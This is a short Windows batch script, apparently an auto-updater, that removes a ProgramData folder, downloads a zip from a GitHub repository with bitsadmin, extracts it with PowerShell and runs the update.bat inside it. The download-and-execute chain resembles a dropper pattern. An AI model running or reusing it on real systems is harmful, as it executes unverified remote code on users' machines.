rmdir /s /q C:\ProgramData\update-main

set url=https://github.com/StockFi/update/archive/refs/heads/main.zip

bitsadmin.exe /transfer "download" %url% C:\ProgramData\main.zip

powershell -command " Expand-Archive 'C:\ProgramData\main.zip' 'C:\ProgramData\' "

del C:\ProgramData\main.zip

timeout /t 3

start C:\ProgramData\update-main\update.bat
